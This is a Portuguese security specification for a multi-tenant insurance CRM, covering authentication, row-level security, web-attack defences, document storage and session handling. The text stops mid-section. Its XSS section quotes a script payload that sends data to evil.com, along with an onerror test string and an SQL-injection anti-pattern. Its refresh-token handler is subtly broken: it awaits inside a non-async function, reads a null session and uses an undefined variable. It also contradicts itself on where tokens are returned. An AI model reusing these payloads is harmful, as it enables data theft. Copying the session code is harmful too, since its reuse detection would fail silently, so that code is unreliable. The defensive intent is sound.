# PIPENEXO — Especificação Técnica Oficial v2.0

**Data de Revisão**: Setembro 2026  
**Status**: Especificação Técnica Oficial (Pré-Implementação)  
**Escopo**: Segurança, Multitenant, 19 melhorias, 5 fases + FASE 0  
**Aprovação Necessária Antes de Implementação**: SIM

---

## ÍNDICE

1. Executivo
2. Princípios Arquiteturais
3. Diagnóstico da Estrutura Atual
4. 10 Problemas Críticos de Segurança (FASE 0)
5. Arquitetura Multi-Tenant
6. Segurança Web (FASE 0)
7. Armazenamento de Documentos (FASE 0)
8. Autenticação e Sessões (FASE 0)
9. Cobrança SaaS (Paralelo às Fases)
10. Backup e Disaster Recovery
11. Schema de Banco de Dados Completo
12. Row-Level Security (RLS) Detalhado
13. Planos de Implementação (FASE 0 a FASE 5)
14. Security Test Suite
15. Critérios de Conclusão
16. Decisões Pendentes

---

## 1. RESUMO EXECUTIVO

O PipeNexo é um CRM SaaS multi-tenant para corretoras de seguros. Esta especificação técnica define a arquitetura de segurança, isolamento de dados, autenticação, permissões e implementação em 5 fases, precedidas por uma FASE 0 (segurança crítica) que é pré-requisito obrigatório para todas as demais.

### Status Atual
- **Frontend**: index.html (540 KB), vanilla JavaScript, localStorage como "banco"
- **Backend**: nexo-ia-backend (Node.js/TypeScript), Postgres, apenas IA integrada
- **Multi-tenant**: Não existe (zero isolamento real)
- **Autenticação**: Fake ("qualquer senha funciona")
- **Auditoria**: Não existe (exceto IA)
- **Storage**: Não existe
- **Backup**: Não existe

### Objetivo
Transformar em um SaaS seguro, multi-tenant, pronto para produção com múltiplas corretoras reais e dados reais.

### Timeline
- **FASE 0 (Segurança)**: 5-7 dias — Bloqueador para tudo o resto
- **FASE 1-5**: 8-12 semanas adicionais

---

## 2. PRINCÍPIOS ARQUITETURAIS (Não Negociáveis)

### 2.1 Nunca Confiar no Frontend
- **Toda** autenticação, autorização, validação de tenant, permissões e regras críticas são re-validadas no backend
- Frontend serve apenas UX; segurança nunca depende de esconder botão ou validação de formulário
- Backend é a única fonte de verdade

### 2.2 Tenant Isolation por Identidade Autenticada
- `company_id` nunca é aceito como entrada do usuário
- Tenant é determinado a partir do token JWT autenticado
- Validado em **toda** requisição no middleware de auth
- Armazenado em `req.context.companyId` imutável

### 2.3 Defense in Depth (Múltiplas Camadas)
1. **Camada de aplicação**: Validação de tenant no código
2. **Camada de banco de dados**: RLS policies no Postgres
3. **Camada de network**: CORS, rate limiting, DDoS protection
4. **Camada de storage**: Signed URLs, isolamento by company_id

### 2.4 Auditoria Completa de Ações Críticas
- Toda ação modificadora (CREATE, UPDATE, DELETE, EXPORT, LOGIN) é registrada
- Immutável; audit logs nunca são alterados por usuários comuns

### 2.5 Segregação de Dados no Banco
- **Schema único** compartilhado (não banco/schema por tenant)
- **company_id** em toda tabela operacional
- **RLS** em toda tabela operacional do Postgres
- **Connection pooling** sem vazamento de contexto entre requests

---

## 3. DIAGNÓSTICO DA ESTRUTURA ATUAL

### 3.1 Frontend (index.html)
```
Arquivo único: 540 KB
Persistência: localStorage (chave "carteira_viva_state_v2")
Banco de dados: array em memória + localStorage
Autenticação: String compara vs. array usuarios[], aceita QUALQUER senha ≠ vazia
Permissões: isGestao() — binária (gestão vê tudo, outros veem só o próprio)
Visibilidade: Baseada em comparação de NOME (string), não ID
Network: Zero — 100% offline
Multi-tenant: Não existe
Segurança: Crítica — dados expostos no DOM antes de login
```

### 3.2 Backend (nexo-ia-backend)
```
Stack: Node.js 24 + TypeScript + Express + Drizzle ORM + PostgreSQL
Escopo: Apenas IA
Autenticação: JWT + bcrypt (não integrado ao CRM)
Permissões: Apenas leitura (IA)
Banco: Schema com company_id, mas sem RLS
Auditoria: Apenas ia_usage_logs
Endpoints: POST /api/ia/chat (único)
Teste: JWT funciona, RLS não testada
```

### 3.3 Gaps Críticos
| Aspecto | Status | Risco |
|---------|--------|-------|
| Autenticação real | ❌ Não existe | Crítico |
| Hash de senha | ❌ Aceita qualquer | Crítico |
| Isolamento tenant | ❌ Não existe | Crítico |
| RLS Postgres | ❌ Não implementado | Crítico |
| Permissões no backend | ❌ Não existe | Crítico |
| Auditoria CRM | ❌ Não existe | Alto |
| Storage | ❌ Não existe | Alto |
| Backup | ❌ Não existe | Alto |
| Segurança web | ❌ Não existe | Crítico |

---

## 4. 10 PROBLEMAS CRÍTICOS DE SEGURANÇA (FASE 0)

### P1: Autenticação Inexistente
**Atual**: 
```javascript
if (user && password.length > 0) { /* login aceito */ }
```
**Risco**: Acesso não autorizado; qualquer e-mail + qualquer senha funciona

**Solução FASE 0**:
- Hash de senha com bcrypt (10+ rounds)
- Validação de senha via `bcrypt.compare()`
- JWT assinado (HS256 ou RS256)
- Refresh token com rotação
- Sessão imutável por request (middleware)

### P2: Validação de Senha Falha
**Atual**: Apenas `password.length > 0`

**Risco**: Brute force; sem proteção contra força bruta

**Solução FASE 0**:
- bcrypt.compare() obrigatório
- Rate limiting: máximo 5 tentativas em 15 minutos por IP
- Bloqueio progressivo: 15 min, 1h, 24h
- Logs em audit_logs (failed_login)
- Eventual: CAPTCHA após 3 falhas

### P3: Dados Privados Expostos Antes de Login
**Atual**: 
```javascript
seedData() // Popula exemplo
renderPipeline() // Renderiza tudo no DOM antes de autenticar
```

**Risco**: Dados sensíveis em DevTools; XSS rouba localStorage

**Solução FASE 0**:
- Frontend: Login é barreira obrigatória; sem token, tela branca
- Backend: Toda rota valida `Authorization: Bearer <token>` antes de retornar qualquer dado
- localStorage: Limpo se token inválido/expirado
- API: Sem fallback "se sem token, retorna exemplo"

### P4: Sem Isolamento por Empresa (Tenant)
**Atual**: Arrays únicos `clientes[]`, `negocios[]` — sem company_id

**Risco**: Impossível múltiplas empresas; qualquer dado poderia vazar

**Solução FASE 0**:
- `company_id` (UUID) em toda tabela operacional
- Middleware injeta `req.context.companyId` a partir do JWT
- Toda query filtra `WHERE company_id = $1`
- Nunca aceita company_id do frontend

### P5: Sem Row-Level Security (RLS)
**Atual**: Sem RLS no Postgres

**Risco**: Bug na app escapa de filtros; conexão pooled pode vazar dados

**Solução FASE 0**:
- Habilitar RLS em toda tabela operacional
- Policies: SELECT, INSERT, UPDATE, DELETE
- Verificação: `current_setting('app.company_id')`
- Connection pooling: limpar contexto entre requests (ver seção 12)
- Role de app: NEVERALLOW BYPASSRLS

### P6: Permissões Apenas no Frontend
**Atual**: `if (!isGestao()) hideButton()` — segurança cosmética

**Risco**: DevTools remove elemento HTML; POST manual executa ação

**Solução FASE 0**:
- Permissões checadas no backend em **toda rota**
- Middleware: valida `canCreate`, `canEdit`, `canDelete` vs. user.role
- Sem permissão: 403 Forbidden (não 200 + mensagem)
- Teste: `curl -X POST /api/deals` sem permissão retorna 403

### P7: Site Público, CRM e SuperAdmin Misturados
**Atual**: Tudo em um único index.html

**Risco**: CRM privado exposto quando compartilham link do Artifact

**Solução FASE 0**:
- 3 frontends separados:
  - `/public/` — Landing page (sem autenticação)
  - `/app/` — CRM (autenticação obrigatória, por empresa)
  - `/admin/` — SuperAdmin (autenticação + role=super_admin)
- 3 rotas de backend separadas (`/public/*`, `/app/*`, `/admin/*`)
- Redirecionamento automático: sem token → `/public/login`

### P8: Sem Auditoria
**Atual**: Nenhuma trilha de quem alterou o quê (exceto IA)

**Risco**: Impossível rastrear violações; sem compliance

**Solução FASE 0**:
- Tabela `audit_logs` com: id, company_id, user_id, acao (CREATE/UPDATE/DELETE), recurso_tipo, recurso_id, valor_antes (JSONB), valor_depois (JSONB), ip, user_agent, criado_em
- Imutável: sem UPDATE/DELETE por usuário comum
- Triggers no PostgreSQL registram automaticamente
- Retenção: 2-7 anos conforme regulamentação

### P9: localStorage como Banco de Dados
**Atual**: `saveState()` serializa tudo em localStorage

**Risco**: Dados não sincronizam; não há backup; usuário pode editar via DevTools

**Solução FASE 0**:
- Backend PostgreSQL como única fonte de verdade
- API REST para cada operação (POST/PUT/DELETE)
- localStorage: apenas cache de UI/estado não-sensível (filtros, abas abertas)
- Tokens: armazenados em httpOnly cookies, NUNCA localStorage (ver seção 8)

### P10: Autenticação Não Isolada por Tenant
**Atual**: Login global; contexto compartilhado entre usuários

**Risco**: Middleware falho expõe dados de outra empresa

**Solução FASE 0**:
- Middleware de auth próprio para cada rota
- Injeta `req.context = { userId, companyId, role, permissions }`
- Toda função de acesso a dados recebe contexto como primeiro param
- Sem contexto = erro (estruturalmente impossível esquecer)
- Testes: simular 2 requests simultâneos, diferentes empresas — contexto isolado

---

## 5. ARQUITETURA MULTI-TENANT

### 5.1 Modelo de Dados
```
┌─ PLATAFORMA (Gerenciado apenas por SuperAdmin)
│  ├─ companies (empresas clientes do PipeNexo)
│  ├─ plans (planos: Básico, Pro, Enterprise)
│  ├─ subscriptions (assinatura de cada empresa)
│  ├─ invoices (faturas/cobranças)
│  └─ audit_logs (imutável, nível plataforma)
│
├─ USUÁRIOS (Por empresa)
│  ├─ users (email único globalmente, company_id específico)
│  ├─ roles (papéis: super_admin, company_admin, manager, user)
│  ├─ permissions (granular: can_create_clients, etc)
│  ├─ sessions (refresh_tokens com hash)
│  └─ team_members (organização dentro da empresa)
│
└─ DADOS (Por empresa — company_id obrigatório)
   ├─ clients
   ├─ deals
   ├─ policies
   ├─ tasks
   ├─ products
   ├─ pipelines
   ├─ documents
   └─ ... (todas com company_id)
```

### 5.2 Fluxo de Request
```
1. User envia requisição + Authorization: Bearer <token>
   ↓
2. Middleware de Auth extrai + valida JWT
   ↓
3. Middleware injeta req.context = { userId, companyId, role, permissions }
   ↓
4. Handler checa permissão (role + granular)
   ↓
5. Query filtra WHERE company_id = context.companyId
   ↓
6. Postgres RLS re-valida (defesa em profundidade)
   ↓
7. Resposta retorna apenas dados de context.companyId
   ↓
8. Ação registrada em audit_logs (company_id, user_id, acao, delta)
```

### 5.3 Isolamento no PostgreSQL
```sql
-- Toda conexão executa (IMEDIATAMENTE após autenticar):
SET app.company_id = 'uuid-da-empresa-autenticada';

-- Toda tabela operacional tem RLS:
ALTER TABLE clients ENABLE ROW LEVEL SECURITY;
CREATE POLICY clients_select_policy ON clients
  FOR SELECT
  USING (company_id = current_setting('app.company_id')::uuid);

-- Mesmo se app.company_id não fosse setado, RLS retorna 0 linhas
-- (nunca error; segurança silenciosa)
```

---

## 6. SEGURANÇA WEB (FASE 0)

### 6.1 Proteção contra XSS (Cross-Site Scripting)
**Ataque**: Injetar `<script>fetch('//evil.com/steal')</script>` em campo de nome do cliente

**Defesa FASE 0**:
```
Nível 1 (Frontend):
- HTML encoding: `&lt;`, `&gt;`, `&quot;` em outputs
- Innertext em vez de innerHTML quando possível
- DOMPurify para inputs de rich text (se existir)

Nível 2 (Backend):
- Validação de input (regex, length, type)
- Sanitização (remover tags HTML de string fields)
- Content-Type sempre application/json

Nível 3 (Headers):
- Content-Security-Policy: "default-src 'self'"
- X-Content-Type-Options: nosniff
- X-XSS-Protection: 1; mode=block

Testes FASE 0:
- [ ] Inserir `<img src=x onerror="alert(1)">` em nome de cliente
- [ ] Deve ser escapado/sanitizado, não executado
- [ ] Verificar no banco: armazenado como string literal, não HTML
```

### 6.2 Proteção contra CSRF (Cross-Site Request Forgery)
**Ataque**: Site malicioso faz `<form action="https://pipenexo/api/deals" method="POST">`

**Defesa FASE 0**:
```
- Requisições não-GET exigem CSRF token (no header X-CSRF-Token)
- Token gerado por GET /api/csrf, vinculado à sessão
- Validado em toda POST/PUT/DELETE

Implementação:
app.post('/api/deals', csrfProtection, authMiddleware, dealController);

Testes FASE 0:
- [ ] POST sem CSRF token retorna 403
- [ ] POST com CSRF token antigo retorna 403
- [ ] POST com CSRF token válido retorna 200/201
```

### 6.3 CORS (Cross-Origin Resource Sharing)
**Risco**: Qualquer domínio acessa API

**Defesa FASE 0**:
```javascript
const corsOptions = {
  origin: ['https://pipenexo.com.br', 'https://app.pipenexo.com.br'],
  credentials: true, // Permite cookies
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-CSRF-Token'],
  maxAge: 86400 // 1 dia
};
app.use(cors(corsOptions));
```

### 6.4 Security Headers (Helmet.js)
```javascript
const helmet = require('helmet');
app.use(helmet());
// Automático:
// - X-Frame-Options: DENY (impede clickjacking)
// - X-Content-Type-Options: nosniff
// - Strict-Transport-Security (HSTS): 1 ano + subdomains
// - Content-Security-Policy
// - Referrer-Policy: no-referrer
```

### 6.5 Validação e Sanitização de Inputs
**Regra**: NUNCA confiar em entrada do usuário

```javascript
const validateAndSanitize = (input, schema) => {
  // 1. Validar tipo, length, pattern (Zod ou Joi)
  const validated = schema.parse(input); // Lança erro se inválido
  
  // 2. Sanitizar (remover tags HTML, trim, lowercase conforme necessário)
  const sanitized = DOMPurify.sanitize(validated);
  
  // 3. Escape para DB (driver já faz bind params, mas não prejudica)
  return sanitized;
};

// Uso:
const clientSchema = z.object({
  nome: z.string().min(1).max(255),
  email: z.string().email(),
  cpf_cnpj: z.string().regex(/^\d{11}$|^\d{14}$/)
});

app.post('/api/clients', authMiddleware, (req, res) => {
  const data = validateAndSanitize(req.body, clientSchema);
  // Prossegue apenas se válido
});

Testes FASE 0:
- [ ] POST /api/clients com nome="" retorna 400
- [ ] POST /api/clients com nome de 1000 caracteres retorna 400
- [ ] POST /api/clients com email inválido retorna 400
- [ ] POST /api/clients com nome legítimo retorna 201
```

### 6.6 Prevenção contra SQL Injection
**Risco**: Construir queries com string concatenation

**Defesa FASE 0**:
```javascript
// ❌ NUNCA:
const query = `SELECT * FROM clients WHERE name = '${req.body.name}'`;
db.query(query);

// ✅ SEMPRE (bind parameters):
const query = 'SELECT * FROM clients WHERE name = $1';
db.query(query, [req.body.name]);

// Drizzle ORM já faz bind params automaticamente
const clients = await db.select()
  .from(clientsTable)
  .where(eq(clientsTable.name, req.body.name));
```

### 6.7 IDOR (Insecure Direct Object Reference)
**Ataque**: Usuário da Empresa A acessa `/api/clients/uuid-empresa-b-cliente` diretamente

**Defesa FASE 0**:
```javascript
app.get('/api/clients/:id', authMiddleware, async (req, res) => {
  const client = await db.select()
    .from(clientsTable)
    .where(and(
      eq(clientsTable.id, req.params.id),
      eq(clientsTable.company_id, req.context.companyId) // ← OBRIGATÓRIO
    ));
  
  if (!client) return res.status(404).json({ error: 'Not found' });
  res.json(client);
});

Testes FASE 0:
- [ ] User A tenta GET /api/clients/:id-de-cliente-de-user-b
- [ ] Retorna 404 (não 403 — oculta existência)
```

### 6.8 Proteção contra Mass Assignment
**Risco**: Frontend envia `{ company_id: 'outra-empresa' }` no body

**Defesa FASE 0**:
```javascript
// ❌ NUNCA:
const data = req.body; // Direto no banco
await updateClient(id, data);

// ✅ SEMPRE (whitelist):
const allowedFields = ['nome', 'email', 'telefone', 'endereco'];
const data = {};
allowedFields.forEach(field => {
  if (field in req.body) data[field] = req.body[field];
});
await updateClient(id, data);
// company_id, user_id, criado_em, etc. NUNCA são atualizáveis
```

### 6.9 Limite de Payload
```javascript
app.use(express.json({ limit: '10mb' })); // Evita DoS
app.use(express.urlencoded({ limit: '10mb' }));
```

### 6.10 Tratamento Seguro de Erros
**Risco**: Stack trace expõe paths de arquivo, versão do banco, etc.

```javascript
// ❌ NUNCA em produção:
app.use((err, req, res, next) => {
  res.status(500).json({ error: err.message, stack: err.stack });
});

// ✅ SEMPRE (sem detalhes internos em produção):
app.use((err, req, res, next) => {
  console.error(err); // Log em servidor
  
  if (process.env.NODE_ENV === 'production') {
    res.status(500).json({ error: 'Internal Server Error' });
  } else {
    res.status(500).json({ error: err.message, stack: err.stack });
  }
});
```

---

## 7. ARMAZENAMENTO DE DOCUMENTOS (FASE 0)

### 7.1 Estratégia Completa
```
Documentos (PDFs, imagens, anexos) do PipeNexo serão armazenados em:
- AWS S3 (ou equivalente: GCS, Azure Blob, MinIO on-premise)
- Bucket privado (sem acesso público)
- Isolamento por company_id (prefixo na chave)
- Assinado URLs temporárias para download
- Controle de permissão no banco
```

### 7.2 Modelo de Dados
```sql
CREATE TABLE documents (
  id UUID PRIMARY KEY,
  company_id UUID REFERENCES companies(id) NOT NULL,
  
  -- Referência ao recurso
  recurso_tipo VARCHAR(50), -- 'client', 'deal', 'policy', 'claim', etc
  recurso_id UUID NOT NULL,
  
  -- Arquivo
  nome_original VARCHAR(255) NOT NULL,
  nome_seguro VARCHAR(255) NOT NULL UNIQUE, -- uuid-{timestamp}-hash.{ext}
  mime_type VARCHAR(50) NOT NULL,
  tamanho_bytes BIGINT NOT NULL,
  storage_key VARCHAR(1024) NOT NULL, -- s3://pipenexo-docs/company-{id}/file-{uuid}
  
  -- Upload
  carregado_por UUID REFERENCES users(id) NOT NULL,
  carregado_em TIMESTAMP DEFAULT NOW(),
  
  -- Segurança
  hash_md5 VARCHAR(32) NOT NULL, -- Validar integridade
  scan_malware_status VARCHAR(20), -- 'pending', 'clean', 'infected'
  scan_malware_timestamp TIMESTAMP,
  
  -- Retenção
  deletado_em TIMESTAMP, -- soft delete
  deletado_por UUID REFERENCES users(id),
  
  criado_em TIMESTAMP DEFAULT NOW(),
  atualizado_em TIMESTAMP DEFAULT NOW()
);

-- Índices
CREATE INDEX documents_company_recurso ON documents(company_id, recurso_tipo, recurso_id);
CREATE INDEX documents_storage_key ON documents(storage_key);
CREATE INDEX documents_scan_malware ON documents(scan_malware_status) WHERE deletado_em IS NULL;
```

### 7.3 Fluxo de Upload
```
1. Frontend seleciona arquivo
   ↓
2. Validação no navegador: tipo, tamanho (<20MB)
   ↓
3. POST /api/documents/presigned-url
   Backend valida permissão + gera signed URL (válida 15 min)
   ↓
4. Frontend faz upload direto para S3 com signed URL
   ↓
5. S3 trigger (Lambda/Cloud Function):
   - Valida magic bytes (não apenas extension)
   - Scan malware (ClamAV, VirusTotal)
   - Gera thumbnail se imagem
   - Retorna status ao backend
   ↓
6. Backend (S3 callback):
   - Atualiza documents.scan_malware_status = 'clean' ou 'infected'
   - Se infectado: delete do S3, marca como deletado no banco
   ↓
7. Frontend ou usuário baixa:
   GET /api/documents/{id}/download
   Backend valida permissão
   Retorna signed URL válida 5 minutos
   Registra em audit_logs (download)
```

### 7.4 Segurança
```sql
-- RLS: User só vê documento se tem acesso ao recurso original
ALTER TABLE documents ENABLE ROW LEVEL SECURITY;

CREATE POLICY documents_access_policy ON documents
  FOR SELECT
  USING (
    company_id = current_setting('app.company_id')::uuid
    AND (
      -- User pode fazer upload de doc
      carregado_por = current_setting('app.user_id')::uuid
      -- User tem acesso ao recurso que o doc está vinculado
      OR EXISTS (
        SELECT 1 FROM clients c
        WHERE c.id = documents.recurso_id
          AND c.company_id = documents.company_id
          AND (
            -- Permissão can_view_clients
            EXISTS (SELECT 1 FROM user_permissions up
              WHERE up.user_id = current_setting('app.user_id')::uuid
              AND up.permission_id = (SELECT id FROM permissions WHERE chave = 'can_view_clients')
              AND up.concedida = true)
          )
      )
    )
  );
```

### 7.5 Proteção contra Acesso Não Autorizado
```javascript
// ❌ NUNCA retornar URL direto do S3
app.get('/api/documents/:id/download', authMiddleware, async (req, res) => {
  const doc = await db.select()
    .from(documentsTable)
    .where(and(
      eq(documentsTable.id, req.params.id),
      eq(documentsTable.company_id, req.context.companyId)
    ));
  
  if (!doc) return res.status(404).json({ error: 'Not found' });
  
  // Validar permissão específica do recurso
  if (doc.recurso_tipo === 'client') {
    const hasAccess = await checkClientAccess(doc.recurso_id, req.context);
    if (!hasAccess) return res.status(403).json({ error: 'Forbidden' });
  }
  
  // Gerar signed URL com 5 minutos de validade
  const signedUrl = await s3.getSignedUrl('getObject', {
    Bucket: 'pipenexo-docs',
    Key: doc.storage_key,
    Expires: 300
  });
  
  // Log
  await logAudit({
    userId: req.context.userId,
    companyId: req.context.companyId,
    acao: 'DOWNLOAD',
    recurso_tipo: 'document',
    recurso_id: doc.id
  });
  
  // Redirecionar para signed URL (user faz download de S3, não da nossa app)
  res.redirect(signedUrl);
});
```

### 7.6 Testes FASE 0
```
- [ ] User A tenta GET /api/documents/:id-user-b retorna 404
- [ ] User A tenta acessar signed URL expirada retorna 403
- [ ] Upload de arquivo > 20MB retorna 413 (Payload Too Large)
- [ ] Upload de .exe retorna 400 (invalid mime type)
- [ ] Upload de arquivo com malware simulado retorna "Arquivo infectado"
- [ ] Documento soft-deletado não aparece em listagens (RLS)
```

---

## 8. AUTENTICAÇÃO E SESSÕES (FASE 0)

### 8.1 Fluxo de Login
```
1. User submeta POST /auth/login { email, password }
   ↓
2. Backend valida rate limit (máx 5 tentativas em 15 min por IP)
   Se limite atingido: retorna 429 Too Many Requests
   Log em audit_logs: failed_login
   ↓
3. Backend busca user por email (case-insensitive, único globalmente)
   Se não existir: retorna genérico 401 (não "email não encontrado")
   ↓
4. Backend compara password com hash (bcrypt.compare)
   Se falha: retorna 401, log em audit_logs
   ↓
5. Backend valida status do user (active, não suspended)
   ↓
6. Backend valida status da empresa (active, não trial expirada, não suspended)
   ↓
7. Backend gera:
   - access_token (JWT, 15 min de validade)
   - refresh_token (novo, 7 dias, hash no banco)
   - session_id (UUID, para logout específico de dispositivo)
   ↓
8. Backend retorna (NUNCA em JSON body):
   - { accessToken } no JSON body
   - { refreshToken } em HttpOnly cookie (Secure, SameSite=Strict)
   - { sessionId } em HttpOnly cookie separado
   ↓
9. Frontend:
   - Armazena accessToken em memória (não localStorage)
   - Cookies são automáticos (browser)
   ↓
10. Registra login bem-sucedido em audit_logs
```

### 8.2 Tokens
**Access Token (JWT)**
```javascript
{
  sub: 'user-uuid', // Subject
  iss: 'pipenexo', // Issuer
  aud: 'pipenexo-app', // Audience
  company_id: 'company-uuid',
  role: 'manager',
  permissions: ['can_view_clients', 'can_create_deals', ...],
  session_id: 'session-uuid',
  iat: 1694000000, // Issued At
  exp: 1694000900 // Expira em 15 minutos
}

Assinatura: HS256 ou RS256
Chave: process.env.JWT_SECRET (mantém no servidor, NUNCA frontend)
```

**Refresh Token**
```
- String aleatória 32 bytes (gerada com crypto.randomBytes)
- NUNCA armazenado em plain text no banco
- Armazenado como hash (SHA-256 do refresh token)
- Válido por 7 dias
- Associado a session_id (logout específico de dispositivo)
- Rotação automática: cada uso gera novo refresh token
- Reutilização detectada: se tenant tentar usar refresh token antigo, toda a sessão é revogada (segurança contra roubo)
```

### 8.3 Refresh Token (Detalhado)
```sql
CREATE TABLE sessions (
  id UUID PRIMARY KEY,
  company_id UUID REFERENCES companies(id) NOT NULL,
  user_id UUID REFERENCES users(id) NOT NULL,
  
  refresh_token_hash VARCHAR(64) NOT NULL UNIQUE, -- SHA-256 hex
  refresh_token_family VARCHAR(64), -- Detectar reutilização
  
  device_name VARCHAR(255), -- "iPhone 14 Safari"
  device_ip VARCHAR(45), -- IPv4 ou IPv6
  device_user_agent VARCHAR(512),
  
  criado_em TIMESTAMP DEFAULT NOW(),
  atualizado_em TIMESTAMP DEFAULT NOW(),
  expires_at TIMESTAMP NOT NULL, -- NOW() + 7 dias
  revogado_em TIMESTAMP -- Logout manual
);

CREATE INDEX sessions_refresh_token ON sessions(refresh_token_hash);
CREATE INDEX sessions_user_expires ON sessions(user_id, expires_at);
```

**Rotação de Refresh Token**
```javascript
app.post('/auth/refresh', (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  const sessionId = req.cookies.sessionId;
  
  if (!refreshToken || !sessionId) {
    return res.status(401).json({ error: 'Missing refresh token' });
  }
  
  // 1. Hash do token recebido
  const tokenHash = crypto.createHash('sha256')
    .update(refreshToken)
    .digest('hex');
  
  // 2. Buscar sessão
  const session = await db.select()
    .from(sessionsTable)
    .where(and(
      eq(sessionsTable.id, sessionId),
      eq(sessionsTable.refresh_token_hash, tokenHash),
      isNull(sessionsTable.revogado_em),
      gt(sessionsTable.expires_at, new Date())
    ));
  
  if (!session) {
    // Token não encontrado ou expirado
    // SE encontrar outro session com refresh_token_family = este,
    // significa reutilização de token antigo após novo ter sido emitido
    // REVOGA toda a sessão do usuário (roubo detectado)
    const potentialCompromise = await db.select()
      .from(sessionsTable)
      .where(and(
        eq(sessionsTable.user_id, userId),
        eq(sessionsTable.refresh_token_family, session.refresh_token_family)
      ));
    
    if (potentialCompromise) {
      // Revogar todas as sessões do usuário
      await db.update(sessionsTable)
        .set({ revogado_em: new Date() })
        .where(eq(sessionsTable.user_id, userId));
      
      // Log: suspeita de token theft
      await logAudit({
        userId,
        companyId: session.company_id,
        acao: 'TOKEN_REUSE_DETECTED',
        recurso_tipo: 'auth',
        detalhes: { session_id: sessionId }
      });
      
      return res.status(401).json({ error: 'Token compromised. All sessions revoked.' });
    }
    
    return res.status(401).json({ error: 'Refresh token invalid or expired' });
  }
  
  // 3. Gerar novo access token
  const newAccessToken = jwt.sign(
    { sub: session.user_id, company_id: session.company_id, ... },
    process.env.JWT_SECRET,
    { expiresIn: '15m' }
  );
  
  // 4. Gerar novo refresh token (rotação)
  const newRefreshToken = crypto.randomBytes(32).toString('hex');
  const newTokenHash = crypto.createHash('sha256')
    .update(newRefreshToken)
    .digest('hex');
  
  // 5. Atualizar sessão com novo token (mantém family para detectar reutilização)
  const tokenFamily = session.refresh_token_family || sessionId; // Primeira vez = sessionId
  await db.update(sessionsTable)
    .set({
      refresh_token_hash: newTokenHash,
      refresh_token_family: tokenFamily,
      atualizado_em: new Date()
    })
    .where(eq(sessionsTable.id, sessionId));
  
  // 6. Retornar
  res.cookie('refreshToken', newRefreshToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'Strict',
    maxAge: 7 * 24 * 60 * 60 * 1000 // 7 dias
  });
  
  res.json({ accessToken: newAccessToken });
});
```

### 8.4 Logout
**Local (um dispositivo)**
```javascript
app.post('/auth/logout', authMiddleware, async (req, res) => {
  const sessionId = req.cookies.sessionId;
  
  // Revogar apenas esta sessão
  await db.update(sessionsTable)
    .set({ revogado_em: new Date() })
    .where(eq(sessionsTable.id, sessionId));
  
  // Limpar cookies
  res.clearCookie('refreshToken');
  res.clearCookie('sessionId');
  
  // Log
  await logAudit({
    userId: req.context.userId,
    companyId: req.context.companyId,
    acao: 'LOGOUT',
    recurso_tipo: 'auth'
  });
  
  res.json({ success: true });
});
```

**Global (todos os dispositivos)**
```javascript
app.post('/auth/logout-all', authMiddleware, async (req, res) => {
  // Revogar todas as sessões do usuário
  await db.update(sessionsTable)
    .set({ revogado_em: new Date() })
    .where(eq(sessionsTable.user_id, req.context.userId));
  
  res.clearCookie('refreshToken');
  res.clearCookie('sessionId');
  
  await logAudit({
    userId: req.context.userId,
    companyId: req.context.companyId,
    acao: 'LOGOUT_ALL',
    recurso_tipo: 'auth'
  });
  
  res.json({ success: true });
});
```

### 8.5 Password Reset
```sql
CREATE TABLE password_resets (
  id UUID PRIMARY KEY,
  user_id UUID REFERENCES users(id) NOT NULL,
  token_hash VARCHAR(64) NOT NULL UNIQUE, -- Hash do token
  used_at TIMESTAMP, -- Marca como usado (one-time)
  expires_at TIMESTAMP NOT NULL, -- 1 hora
  criado_em TIMESTAMP DEFAULT NOW()
);
```

**Fluxo**
```
1. User clica "Esqueci minha senha"
   ↓
2. Frontend envia POST /auth/forgot-password { email }
   ↓
3. Backend:
   - Busca user por email (não revela se existe)
   - Gera token aleatório (32 bytes)
   - Gera hash do token
   - Salva em password_resets (hash, not token)
   - Envia email com link: /reset-password?token={TOKEN}
   ↓
4. User clica link, abre formulário de nova senha
   ↓
5. Frontend envia POST /auth/reset-password { token, newPassword }
   ↓
6. Backend:
   - Hash do token recebido
   - Busca password_resets por hash
   - Valida: não expirado, não usado
   - Marca usado_at = NOW()
   - Atualiza user.senha_hash = bcrypt(newPassword)
   - Revoga todas as sessões do user (força novo login)
   ↓
7. User faz login com nova senha
```

### 8.6 Armazenamento de Tokens (Frontend)
```javascript
// ❌ NUNCA localStorage:
localStorage.setItem('accessToken', token);

// ✅ SEMPRE: memória (session) + HttpOnly cookies
// Access token: variável em memória (perdido ao reload)
let accessToken = null;

app.post('/auth/login', async (req, res) => {
  const response = await fetch('https://api.pipenexo.com.br/auth/login', {
    method: 'POST',
    credentials: 'include', // Enviar/receber cookies
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ email, password })
  });
  
  const { accessToken: token } = await response.json();
  // Armazena em memória (não localStorage)
  accessToken = token;
  // Cookies são automáticos (httpOnly)
});

// Refresh automático
setInterval(async () => {
  const response = await fetch('https://api.pipenexo.com.br/auth/refresh', {
    method: 'POST',
    credentials: 'include'
  });
  const { accessToken: token } = await response.json();
  accessToken = token;
}, 14 * 60 * 1000); // A cada 14 minutos (token dura 15)
```

### 8.7 Rate Limiting e Proteção contra Brute Force
```javascript
const rateLimit = require('express-rate-limit');

// Rate limit geral
const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutos
  max: 100, // 100 requisições
  message: 'Too many requests from this IP',
  standardHeaders: true,
  legacyHeaders: false
});

// Rate limit específico para login
const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // 5 tentativas
  skipSuccessfulRequests: true, // Não conta login bem-sucedido
  keyGenerator: (req) => {
    // Agrupa por IP + email (evita enumeration)
    return `${req.ip}-${req.body.email}`;
  }
});

app.use(globalLimiter);
app.post('/auth/login', loginLimiter, authController.login);
```

---

## 9. COBRANÇA SAAS (PARALELO ÀS FASES)

### 9.1 Entidades
```sql
-- Planos (dados de produto)
CREATE TABLE plans (
  id UUID PRIMARY KEY,
  nome VARCHAR(100) UNIQUE NOT NULL,
  descricao TEXT,
  max_users INT,
  max_api_calls_per_month BIGINT,
  max_storage_mb BIGINT,
  preco_usd_monthly DECIMAL(10, 2),
  ativo BOOLEAN DEFAULT TRUE,
  criado_em TIMESTAMP DEFAULT NOW()
);

-- Subscriptions (relacionamento empresa ↔ plano ↔ pagamento)
CREATE TABLE subscriptions (
  id UUID PRIMARY KEY,
